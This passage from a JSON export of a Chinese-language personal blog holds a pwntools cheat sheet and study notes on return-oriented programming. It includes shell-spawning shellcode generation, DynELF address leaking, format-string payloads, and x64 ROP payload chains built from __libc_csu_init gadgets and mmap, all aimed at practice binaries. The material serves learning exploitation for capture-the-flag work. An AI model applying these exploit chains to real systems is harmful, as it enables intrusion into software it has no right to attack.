#\u63a5\u6536\u5230&#39;\\n&#39;\uff0ckeepends\u6307\u5b9a\u4fdd\u7559&#39;\\n&#39;\nr.recvall() #\u63a5\u6536\u5230EOF\nr.recvrepeat(timeout=default)   #\u63a5\u6536\u5230EOF\u6216timeout\n\nr.interactive()   #\u4e0eshell\u4ea4\u4e92\n\nr.close()   #\u65ad\u5f00\u8fde\u63a5\n\n\n\u6570\u636e\n&gt;&gt;&gt; import struct\n\n&gt;&gt;&gt; p32(0xdeadbeef) == struct.pack(&#39;I&#39;, 0xdeadbeef) #p32\u4e3a\u6253\u5305,p64\u540c\u7406,\u5c0f\u7aef\u5e8f\nTrue\n\n&gt;&gt;&gt; leet = &#39;37130000&#39;.decode(&#39;hex&#39;)\n&gt;&gt;&gt; u32(&#39;abcd&#39;) == struct.unpack(&#39;I&#39;, &#39;abcd&#39;)[0]     #u32\u4e3a\u89e3\u5305,u64\u540c\u7406,\u5c0f\u7aef\u5e8f\nTrue\n\n&gt;&gt;&gt; u8(&#39;A&#39;) == 0x41\nTrue\n\n\n\u8bbe\u7f6e\u76ee\u6807\u67b6\u6784\u548c\u64cd\u4f5c\u7cfb\u7edf\n\u5168\u5c40\u8bbe\u7f6econtext,\u53ef\u4ee5\u5305\u62ec\u5b57\u5927\u5c0f\u548c\u7aef\u5e8f\u3002\n&gt;&gt;&gt; context.arch      = &#39;i386&#39;\n&gt;&gt;&gt; context.os        = &#39;linux&#39;\n&gt;&gt;&gt; context.endian    = &#39;little&#39;\n&gt;&gt;&gt; context.word_size = 32\n\nor\n\n&gt;&gt;&gt; context(arch=&#39;i386&#39;, os=&#39;linux&#39;, endian=&#39;little&#39;, word_size=32)\n\n\u8fd8\u6709\u4e00\u4e2a\u5b9e\u7528\u7684\u53ef\u4ee5\u663e\u793a\u8c03\u8bd5\u4fe1\u606f\uff1a\ncontext.log_level = &quot;debug&quot;\n\n\nELF\u64cd\u4f5c\n&gt;&gt;&gt; e = ELF(&#39;/bin/cat&#39;) #\u83b7\u53d6\u8fd9\u4e2a\u6587\u4ef6\u7684\u53e5\u67c4\n&gt;&gt;&gt; print hex(e.address) #\u57fa\u5730\u5740\n0x400000\n&gt;&gt;&gt; print hex(e.symbols[&#39;write&#39;]) #\u51fd\u6570\u5730\u5740\n0x401680\n&gt;&gt;&gt; print hex(e.got[&#39;write&#39;]) #GOT\u8868\u7684\u5730\u5740\n0x60b070\n&gt;&gt;&gt; print hex(e.plt[&#39;write&#39;]) #PLT\u8868\u7684\u5730\u5740\n0x401680\n\n\n\u5c0f\u5de5\u5177\n\u6808\u6ea2\u51fa\u627e\u504f\u79fb\n&gt;&gt;&gt; print cyclic(20)    #\u751f\u621020\u5b57\u8282\u6bcf4\u4e2a\u5b57\u8282(\u9ed8\u8ba4,\u53ef\u4ee5\u7ed9\u51fa\u53c2\u6570\u5982cyclic(20,n=8)\u6307\u5b9a)\u4e0d\u968f\u673a\u7684\u5b57\u7b26\u4e32\naaaabaaacaaadaaaeaaa\n&gt;&gt;&gt; # Assume EIP = 0x62616166 (&#39;faab&#39; which is pack(0x62616166))  at crash time\n&gt;&gt;&gt; print cyclic_find(&#39;faab&#39;)   #\u6839\u636e4\u4e2a\u5b57\u7b26\u67e5\u627e\u504f\u79fb,\u82e5n!=4\u5fc5\u987b\u6307\u660en\u7684\u53c2\u6570\n120\n\n\u6c47\u7f16\u4e0e\u53cd\u6c47\u7f16\n&gt;&gt;&gt; asm(&#39;mov eax, 0&#39;)   #\u6c47\u7f16\n&#39;\\xb8\\x00\\x00\\x00\\x00&#39;\n&gt;&gt;&gt; disasm(&#39;\\xb8\\x0b\\x00\\x00\\x00&#39;)  #\u53cd\u6c47\u7f16\n&#39;   0:   b8 0b 00 00 00          mov    eax,0xb&#39;\n\nShellcode\u751f\u6210\nshellcraft\u6a21\u5757\u662fshellcode\u7684\u6a21\u5757\uff0c\u5305\u542b\u4e00\u4e9b\u751f\u6210shellcode\u7684\u51fd\u6570\u3002\u5176\u4e2d\u7684\u5b50\u6a21\u5757\u58f0\u660e\u67b6\u6784\uff0c\u6bd4\u5982\uff1a\n\n\nARM\u67b6\u6784: shellcraft.arm\nAMD64\u67b6\u6784: shellcraft.amd64\nIntel 80386\u67b6\u6784: shellcraft.i386\n\u901a\u7528: shellcraft.common\n\n\n\u53ef\u4ee5\u5148\u58f0\u660e\u6846\u67b6\u76f4\u63a5\u6c47\u7f16shellcraft.sh()\uff1a\ncontext(arch=&#39;i386&#39;, os=&#39;linux&#39;)\nshellcode = asm(shellcraft.sh())\n\nDynELF\n\u8fd9\u91cc\u4e3e\u4e86\u4e00\u4e2a32\u4f4d\u7684\u4f8b\u5b50\uff1a\np = process(&#39;./pwnme&#39;)\n\n# \u58f0\u660e\u4e00\u4e2a\u53ea\u9700\u8981\u4e00\u4e2a\u5730\u5740\u7684\u51fd\u6570\uff0c\u5e76\u5728\u8be5\u5730\u5740\u81f3\u5c11\u6cc4\u6f0f\uff08\u8fd4\u56de\uff09\u4e00\u4e2a\u5b57\u8282\ndef leak(address):\n    data = p.read(address, 4)\n    log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))\n    return data\n\n# \u56e0\u4e3a\u662f\u4e3e\u4f8b\uff0c\u5047\u8bbe\u4ee5\u4e0b\u5730\u5740\u6211\u4eec\u90fd\u77e5\u9053\u3002\u5176\u4e2d\u4e00\u4e2a\u6307\u5411\u76ee\u6807\u4e8c\u8fdb\u5236\u6587\u4ef6\u91cc\uff0c\u53e6\u4e24\u4e2a\u6307\u5411so\u5e93\u91cc\nmain   = 0xfeedf4ce\nlibc   = 0xdeadb000\nsystem = 0xdeadbeef\n\n#\u901a\u8fc7\u6784\u9020\u7684leak\u51fd\u6570\u548c\u4e00\u4e2a\u6307\u5411\u76ee\u6807\u4e8c\u8fdb\u5236\u6587\u4ef6\u91cc\u7684\u6307\u9488\uff0c\u53ef\u4ee5\u89e3\u6790\u4efb\u4f55\u5730\u5740\n#\u800c\u4e14\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u4e0d\u9700\u8981\u8fd9\u4e2a\u76ee\u6807\u4e8c\u8fdb\u5236\u6587\u4ef6\u526f\u672c\uff0c\u76f4\u63a5\u89e3\u6790\nd = DynELF(leak, main)\nassert d.lookup(None,     &#39;libc&#39;) == libc\nassert d.lookup(&#39;system&#39;, &#39;libc&#39;) == system\n\n#\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u786e\u5b9e\u6709\u76ee\u6807\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u526f\u672c\uff0c\u53ef\u4ee5\u89e3\u6790\u66f4\u5feb\nd = DynELF(leak, main, elf=ELF(&#39;./pwnme&#39;))\nassert d.lookup(None,     &#39;libc&#39;) == libc\nassert d.lookup(&#39;system&#39;, &#39;libc&#39;) == system\n\n#\u6216\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u89e3\u6790\u53e6\u4e00\u4e2a\u5e93\u4e2d\u7684\u7b26\u53f7\uff0c\u5e76\u7ed9\u51fa\u4e00\u4e2a\u6307\u9488\nd = DynELF(leak, libc + 0x1234)\nassert d.lookup(&#39;system&#39;)      == system\n\nfmtstr\npayload = fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')\n\n\noffset (int) \u2013 \u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u504f\u79fb\nwrites (dict) \u2013 \u5b57\u5178\uff0c\u5411\u54ea\u4e2a\u5730\u5740\u5199\u5165\u4ec0\u4e48\u503c {addr: value, addr2: value2}\nnumbwritten (int) \u2013 \u8f93\u51fa\u5b57\u7b26\u4e32\u5df2\u7ecf\u5199\u5165\u5b57\u8282\u6570\nwrite_size (str) \u2013 byte, short or int.\u5373\u6bcf\u6b21\u5199\u4e00\u4e2a\u5b57\u8282\u3001\u4e24\u4e2a\u5b57\u8282\u8fd8\u662f\u56db\u4e2a\u5b57\u8282\n\n\nattach\n\u8be5\u6a21\u5757\u7528\u4e8e\u8c03\u7528gdb\u8c03\u8bd5\n\u5728python\u6587\u4ef6\u4e2d\u76f4\u63a5\u8bbe\u7f6e\u65ad\u70b9\uff0c\u5f53\u8fd0\u884c\u5230\u8be5\u4f4d\u7f6e\u4e4b\u540e\u5c31\u4f1a\u65ad\u4e0b\nimport pwnlib\nfrom pwn import *\np = process(&#39;./c&#39;)\npwnlib.gdb.attach(p)\n\n", "categories": [{"name": "pwn", "slug": "pwn", "permalink": "/category/pwn/"}], "tags": [{"name": "pwn", "slug": "pwn", "permalink": "/tag/pwn/"}, {"name": "pwntools", "slug": "pwntools", "permalink": "/tag/pwntools/"}]}, {"title": "\u4e00\u6b65\u4e00\u6b65\u5b66ROP\u7b14\u8bb0", "date": "2018-03-28T14:45:00-00.00", "path": "/archives/RopNote/", "text": "\u4e00\u6b65\u4e00\u6b65\u5b66ROP\u7b14\u8bb0\n\n\u539f\u6587\u5730\u5740: \u4e00\u6b65\u4e00\u6b65\u5b66ROP\n\nx86\n\u65e0\u4fdd\u62a4\n\n\u5173\u6389canary:  -fno-stack-protector\n\u5173\u6389NX:  -z execstack\n\u5173\u6389PIE:  sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space\n\n\u7ed5\u8fc7NX\ngdb\u4e0b\u627esystem()\u548c&quot;/bin/sh\\x00&quot;\u7684\u5730\u5740:\n(gdb) print system\n$1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt;\n(gdb) print __libc_start_main\n$2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt;\n(gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;\n0xb7f81ff8\n(gdb) x/s 0xb7f81ff8\n0xb7f81ff8:  &quot;/bin/sh&quot;\n\n\u7ed5\u8fc7NX\u548cPIE\n\n\u770bplt : objdump -d -j .plt level2\n\u770bgot : objdump -R level2\n\u67e5\u770b\u76ee\u6807\u7a0b\u5e8f\u8c03\u7528\u7684so\u5e93 : ldd level2\n\n\u7528pwntools:\nelf = ELF(&#39;level2&#39;)\nplt_write = elf.symbols[&#39;write&#39;]\ngot_write = elf.got[&#39;write&#39;]\n\nlibc = ELF(&#39;libc.so&#39;)\nsystem_addr = write_addr - (libc.symbols[&#39;write&#39;] - libc.symbols[&#39;system&#39;])\n\n\u65e0libc.so\n\u6b65\u9aa4:\n\n\u6cc4\u9732__libc_start_main\u5730\u5740\n\u83b7\u53d6libc\u7248\u672c\n\u83b7\u53d6system\u5730\u5740\u4e0e/bin/sh\u7684\u5730\u5740\n\u518d\u6b21\u6267\u884c\u6e90\u7a0b\u5e8f\n\u89e6\u53d1\u6808\u6ea2\u51fa\u6267\u884csystem(\u201c/bin/sh\u201d)\n\nDynELF\u7684\u4f7f\u7528:\ndef leak(address):\n    payload1 = &#39;a&#39;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)\n    p.send(payload1)\n    data = p.recv(4)\n    print &quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;))\n    return data\n\nd = DynELF(leak, elf=ELF(&#39;./level2&#39;))\nsystem_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)\n\n\nx64\n\u4f20\u53c2\u533a\u522b\n\n\u524d\u516d\u4e2a\u53c2\u6570\u4fdd\u5b58\u987a\u5e8f : RDI, RSI, RDX, RCX, R8, R9\n\ngadgets\n\n\u627eROP:  ROPgadget --binary level4 --only &quot;pop|ret&quot;\n\u8fc7\u6ee4:  ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep rdi\n\n\u901a\u7528gadgets part1\n__libc_csu_init()\u4e0b:\n.text:0000000000400840                 public __libc_csu_init\n.text:0000000000400840 __libc_csu_init proc near               ; DATA XREF: _start+16o\n.text:0000000000400840                 push    r15\n.text:0000000000400842                 mov     r15d, edi\n.text:0000000000400845                 push    r14\n.text:0000000000400847                 mov     r14, rsi\n.text:000000000040084A                 push    r13\n.text:000000000040084C                 mov     r13, rdx\n.text:000000000040084F                 push    r12\n.text:0000000000400851                 lea     r12, __frame_dummy_init_array_entry\n.text:0000000000400858                 push    rbp\n.text:0000000000400859                 lea     rbp, __do_global_dtors_aux_fini_array_entry\n.text:0000000000400860                 push    rbx\n.text:0000000000400861                 sub     rbp, r12\n.text:0000000000400864                 xor     ebx, ebx\n.text:0000000000400866                 sar     rbp, 3\n.text:000000000040086A                 sub     rsp, 8\n.text:000000000040086E                 call    _init_proc\n.text:0000000000400873                 test    rbp, rbp\n.text:0000000000400876                 jz      short loc_400896\n.text:0000000000400878                 nop     dword ptr [rax+rax+00000000h]\n.text:0000000000400880\n.text:0000000000400880 loc_400880:                             ; CODE XREF: __libc_csu_init+54j\n.text:0000000000400880                 mov     rdx, r13\n.text:0000000000400883                 mov     rsi, r14\n.text:0000000000400886                 mov     edi, r15d\n.text:0000000000400889                 call    qword ptr [r12+rbx*8]\n.text:000000000040088D                 add     rbx, 1\n.text:0000000000400891                 cmp     rbx, rbp\n.text:0000000000400894                 jnz     short loc_400880\n.text:0000000000400896\n.text:0000000000400896 loc_400896:                             ; CODE XREF: __libc_csu_init+36j\n.text:0000000000400896                 add     rsp, 8\n.text:000000000040089A                 pop     rbx\n.text:000000000040089B                 pop     rbp\n.text:000000000040089C                 pop     r12\n.text:000000000040089E                 pop     r13\n.text:00000000004008A0                 pop     r14\n.text:00000000004008A2                 pop     r15\n.text:00000000004008A4                 retn\n.text:00000000004008A4 __libc_csu_init endp\n\n\u56e0\u6b64\u82e5\u8981\u8c03\u7528write(1,got_write,8), \u5219\u53ef\u8fd9\u6837\u6784\u9020:\n# rbx\u5fc5\u987b\u4e3a0,\u56e0\u4e3acall qword ptr [r12+rbx*8]\n# rbp\u5fc5\u987b\u4e3a1,0x40088D~0x400894\u6709\u4e00\u4e2acmp,jnz\n# r12 = addr_got,\u56e0\u4e3acall qword ptr [r12+rb1x*8]\n# r13 = rdx = arg3\n# r14 = rsi = arg2\n# r15 = edi = arg1\n# retn\u7684padding\u9700\u89817*8=56byte\n\n# padding\npayload1 =  &quot;\\x00&quot;*136 \n# pop rbx\u5730\u5740_rbx=0_rbp=1_\u8c03\u7528\u51fd\u6570got_arg1_arg2_arg3\npayload1 += p64(0x40089A) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) \n# mov rdx,r13\u5730\u5740(\u6ce8\u610f\u770b\u539f\u59cb\u6c47\u7f16)\npayload1 += p64(0x400880) \n# padding(7*8=56byte)\npayload1 += &quot;\\x00&quot;*56\n# ret\npayload1 += p64(main)\n\n\u6b64\u5916\u8fd8\u6709\u4e00\u4e2ax64 gadgets, \u5c31\u662f:\n\npop rdi\nret\n\n\u7684gadgets. \u8fd9\u4e2agadgets\u662f\u7531opcode\u9519\u4f4d\u4ea7\u751f\u7684.\n\u5982\u4e0a\u7684\u4f8b\u5b50\u4e2d0x4008A2, 0x4008A4\u4e24\u5904\u7684\u5b57\u8282\u7801\u5982\u4e0b:\n\n0x41 0x5f 0xc3\n\n\u610f\u601d\u662fpop r15, ret, \u4f46\u662f\u6070\u597dpop rdi, ret\u7684opcode\u5982\u4e0b:\n\n0x5f 0xc3\n\n\u56e0\u6b64\u5982\u679c\u6211\u4eec\u6307\u54110x4008A3\u5c31\u53ef\u4ee5\u83b7\u5f97pop rdi, ret\u7684opcode, \u4ece\u800c\u5bf9\u4e8e\u5355\u53c2\u6570\u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u83b7\u5f97\u6267\u884c\n\u4e0e\u6b64\u7c7b\u4f3c\u7684, \u8fd8\u67090x4008A1\u5904\u7684 pop rsi, pop r15, ret\n\u90a3\u4e48\u8fd9\u4e2a\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u6211\u4eec\u77e5\u9053x64\u4f20\u53c2\u987a\u5e8f\u662frdi, rsi, rdx, rcx.\n\u6240\u4ee5rsi\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570, \u6211\u4eec\u53ef\u4ee5\u5728rop\u4e2d\u914d\u5408pop rdi,ret\u6765\u4f7f\u7528pop rsi, pop r15,ret, \u8fd9\u6837\u5c31\u53ef\u4ee5\u8f7b\u677e\u7684\u8c03\u75282\u4e2a\u53c2\u6570\u7684\u51fd\u6570.\n\u7efc\u4e0a, \u5c31\u662fx64\u4e0b\u5229\u7528\u901a\u7528gadgets\u8c03\u7528\u4e00\u4e2a\u53c2\u6570, \u4e24\u4e2a\u53c2\u6570, \u4e09\u4e2a\u53c2\u6570\u51fd\u6570\u7684\u65b9\u6cd5.\n\u901a\u7528gadgets part2\n_dl_runtime_resolve()\u4e0b(\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u662f\u968f\u673a\u7684):\n0x7ffff7def200 &lt;_dl_runtime_resolve&gt;:       sub     rsp,0x38\n0x7ffff7def204 &lt;_dl_runtime_resolve+4&gt;:     mov     QWORD PTR [rsp],rax\n0x7ffff7def208 &lt;_dl_runtime_resolve+8&gt;:     mov     QWORD PTR [rsp+0x8],rcx\n0x7ffff7def20d &lt;_dl_runtime_resolve+13&gt;:    mov     QWORD PTR [rsp+0x10],rdx\n0x7ffff7def212 &lt;_dl_runtime_resolve+18&gt;:    mov     QWORD PTR [rsp+0x18],rsi\n0x7ffff7def217 &lt;_dl_runtime_resolve+23&gt;:    mov     QWORD PTR [rsp+0x20],rdi\n0x7ffff7def21c &lt;_dl_runtime_resolve+28&gt;:    mov     QWORD PTR [rsp+0x28],r8\n0x7ffff7def221 &lt;_dl_runtime_resolve+33&gt;:    mov     QWORD PTR [rsp+0x30],r9\n0x7ffff7def226 &lt;_dl_runtime_resolve+38&gt;:    mov     rsi,QWORD PTR [rsp+0x40]\n0x7ffff7def22b &lt;_dl_runtime_resolve+43&gt;:    mov     rdi,QWORD PTR [rsp+0x38]\n0x7ffff7def230 &lt;_dl_runtime_resolve+48&gt;:    call    0x7ffff7de8680 &lt;_dl_fixup&gt;\n0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;:    mov     r11,rax\n0x7ffff7def238 &lt;_dl_runtime_resolve+56&gt;:    mov     r9,QWORD PTR [rsp+0x30]\n0x7ffff7def23d &lt;_dl_runtime_resolve+61&gt;:    mov     r8,QWORD PTR [rsp+0x28]\n0x7ffff7def242 &lt;_dl_runtime_resolve+66&gt;:    mov     rdi,QWORD PTR [rsp+0x20]\n0x7ffff7def247 &lt;_dl_runtime_resolve+71&gt;:    mov     rsi,QWORD PTR [rsp+0x18]\n0x7ffff7def24c &lt;_dl_runtime_resolve+76&gt;:    mov     rdx,QWORD PTR [rsp+0x10]\n0x7ffff7def251 &lt;_dl_runtime_resolve+81&gt;:    mov     rcx,QWORD PTR [rsp+0x8]\n0x7ffff7def256 &lt;_dl_runtime_resolve+86&gt;:    mov     rax,QWORD PTR [rsp]\n0x7ffff7def25a &lt;_dl_runtime_resolve+90&gt;:    add     rsp,0x48\n0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;:    jmp     r11\n\n\n\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684PLT\u786e\u5b9a_dl_runtime_resolve()\u5730\u5740, \u5176\u4e2dPLT[2]\u4e2d\u8df3\u8f6c\u7684\u5730\u5740\u5c31\u662f_dl_runtime_resolve()\u5730\u5740\n\u8981\u5229\u7528\u8fd9\u4e2agadget, \u6211\u4eec\u8fd8\u9700\u8981\u63a7\u5236rax\u7684\u503c, \u56e0\u4e3agadget\u662f\u901a\u8fc7rax\u8df3\u8f6c\u7684:0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;:    mov    r11,rax\n...\n0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;:    jmp    r11\n\n\n\n\n\u5229\u7528mmap\u6267\u884c\u4efb\u610fshellcode\nmmap\u6216\u8005mprotect\u5c06\u67d0\u5757\u5185\u5b58\u6539\u6210RWX, \u7136\u540e\u5c06shellcode\u4fdd\u5b58\u5230\u8fd9\u5757\u5185\u5b58, \u7136\u540e\u63a7\u5236pc\u8df3\u8f6c\u8fc7\u53bb\u5c31\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u7684shellcode\u4e86.\n# mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)\n# \u53c2\u6570\u4f20\u9012\u4ecelinker_addr + 0x35\u5f00\u59cb\n# \u9700\u8981\u5148pop rax,ret,\u4e14\u4f7frax=mmap_addr\n# r9,r8,rdi,rsi,rdx,rcx,rax\n# \u6700\u540e\u9700\u8981(0x48-8*6)/8 = 3Byte padding\npayload3 =  &quot;\\x00&quot;*136\npayload3 += p64(pop_rax_ret) + p64(mmap_addr)\npayload3 += p64(linker_addr+0x35) + p64(0) + p64(34) + p64(7) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0) + p64(0) + p64(0)\n\n", "categories": [{"name": "pwn", "slug": "pwn", "permalink": "/category/pwn/"}], "tags": [{"name": "pwn", "slug": "pwn", "permalink": "/tag/pwn/"}, {"name": "ROP", "slug": "ROP", "permalink": "/tag/ROP/"}]}], "pages": [{"title": "\u5173\u4e8e", "date": "2018-03-28T00:00:00-00.00", "path": "/about/", "text": "\u8fd9\u91cc\u662f\u6211\u7684\u4e2a\u4eba\u535a\u5ba2\uff0c\u901a\u8fc7 GitHub \u7ba1\u7406\u4e0e\u6784\u5efa\u3002\nContact\nEmail: yuripwn@gmail.com\n", "categories": [], "tags": []}]}